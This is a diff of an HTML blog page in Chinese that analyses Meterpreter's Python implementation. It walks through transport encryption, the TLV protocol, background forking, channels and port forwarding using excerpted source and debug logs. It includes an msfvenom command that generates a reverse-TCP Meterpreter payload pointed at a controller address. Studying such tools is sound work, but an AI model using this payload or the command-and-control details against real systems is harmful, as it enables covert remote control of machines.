@@ -57,37 +57,37 @@
         <ul>
           
           <li>
-            <a href="https://chenx6.github.io/post/meterpreter/#huo-qu-dai-ma">获取代码</a>
+            <a href="https://chenx6.github.io/post/meterpreter/#获取代码">获取代码</a>
             
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/meterpreter/#jian-yao-fen-xi">简要分析</a>
+            <a href="https://chenx6.github.io/post/meterpreter/#简要分析">简要分析</a>
             
             <ul>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#fen-xi-qian-zhun-bei">分析前准备</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#分析前准备">分析前准备</a>
               </li>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#xie-yi-bu-fen">协议部分</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#协议部分">协议部分</a>
               </li>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#kai-shi-bu-fen">开始部分</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#开始部分">开始部分</a>
               </li>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#pythonmeterpreter">PythonMeterpreter</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#PythonMeterpreter">PythonMeterpreter</a>
               </li>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#meterpreterchannel">MeterpreterChannel</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#MeterpreterChannel">MeterpreterChannel</a>
               </li>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#core-he-stdapi">core 和 stdapi</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#core_和_stdapi">core 和 stdapi</a>
               </li>
               
             </ul>
@@ -95,12 +95,12 @@
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/meterpreter/#gong-neng-fen-xi">功能分析</a>
+            <a href="https://chenx6.github.io/post/meterpreter/#功能分析">功能分析</a>
             
             <ul>
               
               <li>
-                <a href="https://chenx6.github.io/post/meterpreter/#duan-kou-zhuan-fa">端口转发</a>
+                <a href="https://chenx6.github.io/post/meterpreter/#端口转发">端口转发</a>
               </li>
               
             </ul>
@@ -108,12 +108,12 @@
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/meterpreter/#zong-jie">总结</a>
+            <a href="https://chenx6.github.io/post/meterpreter/#总结">总结</a>
             
           </li>
           
           <li>
-            <a href="https://chenx6.github.io/post/meterpreter/#refs">Refs</a>
+            <a href="https://chenx6.github.io/post/meterpreter/#Refs">Refs</a>
             
           </li>
           
@@ -126,12 +126,12 @@
 <li>2022-10-23 初版博文发布</li>
 <li>2023-01-21 加入端口转发功能的实现分析</li>
 </ul>
-<h2 id="huo-qu-dai-ma">获取代码</h2>
+<h2 id="获取代码">获取代码</h2>
 <p>meterpreter 的本体有很多种语言的实现，包括 C 实现的 <a href="https://github.com/rapid7/mettle">mettle</a>,还有在 <a href="https://github.com/rapid7/metasploit-payloads">metasploit-payloads</a> 仓库里的 Python/PHP/Java 实现。这里选择 Python 实现。并且由于代码块中存在很多等待 Patch 的地方，所以这里直接用 msfvenom 生成一个。</p>
 <pre data-lang="bash" class="language-bash z-code"><code class="language-bash" data-lang="bash"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">msfvenom</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>payload</span> python/meterpreter/reverse_tcp LHOST=192.168.92.1 LPORT=4444</span>
 </span></code></pre>
-<h2 id="jian-yao-fen-xi">简要分析</h2>
-<h3 id="fen-xi-qian-zhun-bei">分析前准备</h3>
+<h2 id="简要分析">简要分析</h2>
+<h3 id="分析前准备">分析前准备</h3>
 <p>在代码中有开启日志的选项，并且还有去除启动时 <code>fork</code> 的选项，为了调试，把这两个选项修改成如下</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> these values will be patched, DO NOT CHANGE THEM
 </span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">DEBUGGING</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-constant z-language z-python">True</span>
@@ -178,9 +178,9 @@ DEBUG:root:[*] sending response packet
 DEBUG:root:[*] running method stdapi_fs_ls
 DEBUG:root:[*] sending response packet
 </span></code></pre>
-<h3 id="xie-yi-bu-fen">协议部分</h3>
+<h3 id="协议部分">协议部分</h3>
 <p>在接收数据时，程序主要是通过 <code>Transport</code> 类进行通信，并对通信数据的解密，得到的二进制数据通过 <code>packet_get_tlv</code> 函数进行解析。在返回数据时，则是通过 <code>tlv_pack</code> 函数将 TLV Packet 转换成二进制数据，并通过 <code>Transport</code> 类对数据进行加密通信。</p>
-<h4 id="transport-lei">Transport 类</h4>
+<h4 id="Transport_类">Transport 类</h4>
 <p>程序会通过 <code>Transport</code> 类进行通信，这个类会对通信数据使用 xor/AES 进行混淆。而 <code>TcpTransport</code>/<code>HttpTransport</code> 通过多态，重载 <code>_send_packet</code> 和 <code>_get_packet</code> 方法，来实现在不同的底层协议下的通信。这个协议前 4 字节是 XOR 的密钥，然后后 4 字节是这个 Packet 的长度，通过 XOR 解密长度后，继续从 socket 中读取，就可以取得整个 Packet 的数据。</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-class z-python"><span class="z-storage z-type z-class z-python"><span class="z-keyword z-declaration z-class z-python">class</span></span> <span class="z-entity z-name z-class z-python"><span class="z-meta z-generic-name z-python">TcpTransport</span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-punctuation z-section z-inheritance z-begin z-python">(</span></span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-entity z-other z-inherited-class z-python">Transport</span><span class="z-punctuation z-section z-inheritance z-end z-python">)</span></span><span class="z-meta z-class z-python"><span class="z-punctuation z-section z-class z-begin z-python">:</span></span>
     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> ...省略别的方法...
@@ -246,7 +246,7 @@ DEBUG:root:[*] sending response packet
         <span class="z-meta z-qualified-name z-python"><span class="z-variable z-language z-python">self</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">communication_last</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">time</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">time</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
         <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">pkt</span></span>
 </span></code></pre>
-<h4 id="tlv-xie-yi">TLV 协议</h4>
+<h4 id="TLV_协议">TLV 协议</h4>
 <p>meterpreter 使用的是 TLV 协议进行通信，整个 Packet 由 3 部分组成，前 4 个字节是 Packet 长度，后 4 个字节是 Packet 类型，剩下的字节则是数据。下面是解析数据的代码。将原始 Packet 数据传递给 <code>packet_get_tlv</code> 函数，返回值是包含解析后数据的 dict。</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-annotation z-python"><span class="z-punctuation z-definition z-annotation z-python">@</span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-annotation z-python"><span class="z-meta z-generic-name z-python">export</span></span></span></span>
 <span class="z-meta z-function z-python"><span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">packet_enum_tlvs</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">pkt</span><span class="z-punctuation z-separator z-parameters z-python">,</span> <span class="z-variable z-parameter z-python">tlv_type</span></span><span class="z-meta z-function z-parameters z-default-value z-python"><span class="z-keyword z-operator z-assignment z-python">=</span><span class="z-constant z-language z-python">None</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
@@ -283,7 +283,7 @@ DEBUG:root:[*] sending response packet
 <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> ...
 </span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">TLV_TYPE_CHANNEL_ID</span></span>            <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">TLV_META_TYPE_UINT</span></span>    <span class="z-keyword z-operator z-arithmetic z-python">|</span> <span class="z-constant z-numeric z-integer z-decimal z-python">50</span>
 </span></code></pre>
-<h3 id="kai-shi-bu-fen">开始部分</h3>
+<h3 id="开始部分">开始部分</h3>
 <p>下面是代码最先运行的部分，可以看到是进行了 <code>fork</code>，并 <code>setsid</code> 让程序运行在后台，然后就是使用 socket 监听 4444 端口。收到连接时，使用 <code>TcpTransport</code> 建立一个 <code>Transport</code> 之后进入 <code>PythonMeterpreter</code> 进行主要交互逻辑。</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">_try_to_fork</span></span> <span class="z-keyword z-operator z-assignment z-python">=</span> <span class="z-meta z-qualified-name z-python"><span class="z-variable z-other z-constant z-python">TRY_TO_FORK</span></span> <span class="z-keyword z-operator z-logical z-python">and</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-support z-function z-builtin z-python">hasattr</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python">fork<span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
 <span class="z-meta z-statement z-conditional z-if z-python"><span class="z-keyword z-control z-conditional z-if z-python">if</span> <span class="z-keyword z-operator z-logical z-python">not</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">_try_to_fork</span></span> <span class="z-keyword z-operator z-logical z-python">or</span> <span class="z-meta z-group z-python"><span class="z-punctuation z-section z-group z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">_try_to_fork</span></span> <span class="z-keyword z-operator z-logical z-python">and</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">os</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">fork</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span> <span class="z-keyword z-operator z-comparison z-python">==</span> <span class="z-constant z-numeric z-integer z-decimal z-python">0</span><span class="z-punctuation z-section z-group z-end z-python">)</span></span><span class="z-punctuation z-section z-block z-conditional z-if z-python">:</span></span>
@@ -302,7 +302,7 @@ DEBUG:root:[*] sending response packet
     <span class="z-comment z-line z-number-sign z-python"><span class="z-punctuation z-definition z-comment z-python">#</span> PATCH-SETUP-TRANSPORTS #
 </span>    <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">met</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">run</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
 </span></code></pre>
-<h3 id="pythonmeterpreter">PythonMeterpreter</h3>
+<h3 id="PythonMeterpreter">PythonMeterpreter</h3>
 <p>这个类是真正负责逻辑交互的类。主要循环在 <code>run</code> 函数中，函数主要是获取 TLV Packet 数据，然后在 <code>create_response</code> 函数中解析数据，调用相关的处理函数，获得返回值，最后发送回复。然后是遍历 channel 读取和发送数据，从 channel 中读取数据后，发送给控制端。channel 的设计在后文中会讲解。</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-class z-python"><span class="z-storage z-type z-class z-python"><span class="z-keyword z-declaration z-class z-python">class</span></span> <span class="z-entity z-name z-class z-python"><span class="z-meta z-generic-name z-python">PythonMeterpreter</span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-punctuation z-section z-inheritance z-begin z-python">(</span></span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-entity z-other z-inherited-class z-python">object</span><span class="z-punctuation z-section z-inheritance z-end z-python">)</span></span><span class="z-meta z-class z-python"><span class="z-punctuation z-section z-class z-begin z-python">:</span></span>
 <span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">run</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
@@ -330,7 +330,7 @@ DEBUG:root:[*] sending response packet
                     <span class="z-punctuation z-section z-sequence z-end z-python">]</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
                     <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-language z-python">self</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send_packet</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">tlv_pack_request</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python">core_channel_write<span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">write_request_parts</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
 </span></code></pre>
-<h3 id="meterpreterchannel">MeterpreterChannel</h3>
+<h3 id="MeterpreterChannel">MeterpreterChannel</h3>
 <p>Channel 是 meterpreter 运行程序，开启端口转发等功能时，进行交互的“通道”，这样的设计可以让其同时运行不同的功能，而不阻塞和用户之间的交互。在下面的代码中可以看到，Channel 和 meterpreter 之间的读写，也是通过 TLV 协议进行交互的。</p>
 <p>不同功能的 Channel 通过重载 <code>MeterpreterChannel</code> 的 <code>read</code> 和 <code>write</code> 等方法，实现不同的交互。</p>
 <pre data-lang="python" class="language-python z-code"><code class="language-python" data-lang="python"><span class="z-source z-python"><span class="z-meta z-class z-python"><span class="z-storage z-type z-class z-python"><span class="z-keyword z-declaration z-class z-python">class</span></span> <span class="z-entity z-name z-class z-python"><span class="z-meta z-generic-name z-python">MeterpreterChannel</span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-punctuation z-section z-inheritance z-begin z-python">(</span></span></span><span class="z-meta z-class z-inheritance z-python"><span class="z-entity z-other z-inherited-class z-python">object</span><span class="z-punctuation z-section z-inheritance z-end z-python">)</span></span><span class="z-meta z-class z-python"><span class="z-punctuation z-section z-class z-begin z-python">:</span></span>
@@ -355,10 +355,10 @@ DEBUG:root:[*] sending response packet
 <span class="z-meta z-function z-python">    <span class="z-storage z-type z-function z-python"><span class="z-keyword z-declaration z-function z-python">def</span></span> <span class="z-entity z-name z-function z-python"><span class="z-meta z-generic-name z-python">write</span></span></span><span class="z-meta z-function z-parameters z-python"><span class="z-punctuation z-section z-parameters z-begin z-python">(</span></span><span class="z-meta z-function z-parameters z-python"><span class="z-variable z-parameter z-python">self</span><span class="z-punctuation z-separator z-parameters z-python">,</span> <span class="z-variable z-parameter z-python">data</span><span class="z-punctuation z-section z-parameters z-end z-python">)</span></span><span class="z-meta z-function z-python"><span class="z-punctuation z-section z-function z-begin z-python">:</span></span>
         <span class="z-keyword z-control z-flow z-return z-python">return</span> <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-language z-python">self</span><span class="z-punctuation z-accessor z-dot z-python">.</span><span class="z-meta z-generic-name z-python">sock</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">data</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
 </span></code></pre>
-<h3 id="core-he-stdapi">core 和 stdapi</h3>
+<h3 id="core_和_stdapi">core 和 stdapi</h3>
 <p>core 是 meterpreter 的基础功能，包括 channel 和 transport 的管理等功能。这些功能的实现是在 <code>PythonMeterpreter</code> 类中以 &quot;_core&quot; 开头的函数，在类初始化时加入到 <code>extension_functions</code> dict 中供后续调用。而 stdapi 则是平时用到的扩展功能，包括上传/下载文件等功能，通过 <code>core_loadlib</code> 功能进行动态载入。</p>
-<h2 id="gong-neng-fen-xi">功能分析</h2>
-<h3 id="duan-kou-zhuan-fa">端口转发</h3>
+<h2 id="功能分析">功能分析</h2>
+<h3 id="端口转发">端口转发</h3>
 <p>开启端口转发后，访问端口可以看到下面的日志，配合日志可以对代码进行分析。</p>
 <pre data-lang="txt" class="language-txt z-code"><code class="language-txt" data-lang="txt"><span class="z-text z-plain">DEBUG:root:[*] running method core_channel_open
 DEBUG:root:[*] core_channel_open dispatching to handler: channel_open_stdapi_net_tcp_client
@@ -428,9 +428,9 @@ DEBUG:root:[*] sending response packet
                 <span class="z-punctuation z-section z-sequence z-end z-python">]</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
                 <span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-language z-python">self</span></span><span class="z-meta z-qualified-name z-python"><span class="z-punctuation z-accessor z-dot z-python">.</span></span><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">send_packet</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-function-call z-python"><span class="z-meta z-qualified-name z-python"><span class="z-variable z-function z-python"><span class="z-meta z-generic-name z-python">tlv_pack_request</span></span></span></span><span class="z-meta z-function-call z-arguments z-python"><span class="z-punctuation z-section z-arguments z-begin z-python">(</span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python"><span class="z-punctuation z-definition z-string z-begin z-python">&#39;</span></span></span><span class="z-meta z-string z-python"><span class="z-string z-quoted z-single z-python">core_channel_write<span class="z-punctuation z-definition z-string z-end z-python">&#39;</span></span></span><span class="z-punctuation z-separator z-arguments z-python">,</span> <span class="z-meta z-qualified-name z-python"><span class="z-meta z-generic-name z-python">write_request_parts</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span><span class="z-punctuation z-section z-arguments z-end z-python">)</span></span>
 </span></code></pre>
-<h2 id="zong-jie">总结</h2>
+<h2 id="总结">总结</h2>
 <p>这里只是简单的过了一遍 meterpreter Python 实现的主体代码。加密密钥的传输，stdapi 的添加等细节则是没有提到，等后面有空了可能就会写了(</p>
-<h2 id="refs">Refs</h2>
+<h2 id="Refs">Refs</h2>
 <ul>
 <li><a href="https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html">Using Metasploit Advanced Meterpreter Overview</a></li>
 <li><a href="http://www.hick.org/code/skape/papers/meterpreter.pdf">original specification</a></li>
